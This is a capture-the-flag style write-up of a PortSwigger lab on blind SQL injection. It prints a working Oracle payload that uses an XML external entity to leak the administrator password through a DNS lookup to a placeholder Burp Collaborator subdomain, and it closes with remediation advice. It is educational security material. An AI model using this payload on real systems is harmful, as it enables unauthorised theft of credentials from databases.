# Lab 16 — Blind SQL injection with out-of-band data exfiltration

**Category:** SQL Injection
**Difficulty:** Expert
**Reference:** https://portswigger.net/web-security/sql-injection/blind

## Objective
Go beyond simply confirming the OAST injection: exfiltrate the actual administrator password by embedding it inside the DNS lookup itself.

## Vulnerability
Same OAST-capable injection point as lab 15, now used to leak data via the DNS query name rather than just prove connectivity.

## Steps to Reproduce
1. Build a payload that concatenates the administrator's password into the hostname being resolved.
2. Trigger the request and watch Burp Collaborator for the resulting DNS interaction.
3. Read the exfiltrated password directly out of the logged subdomain, then log in as administrator.

## Payload(s) Used
```
TrackingId=x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-SUBDOMAIN.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

## Explanation
By concatenating the subquery result (the administrator's password) directly into the hostname Oracle is told to resolve, the password is smuggled out via the DNS query name itself. Burp Collaborator logs the exact subdomain that was looked up, revealing the password in plaintext in the interaction log without ever needing to brute-force individual characters.

## Remediation
Same as lab 15: block outbound DNS/HTTP callbacks from the database server, strip dangerous XML/network functions, and use parameterized queries.

---
*Lab solved on PortSwigger Web Security Academy. Writeup by Miley.*
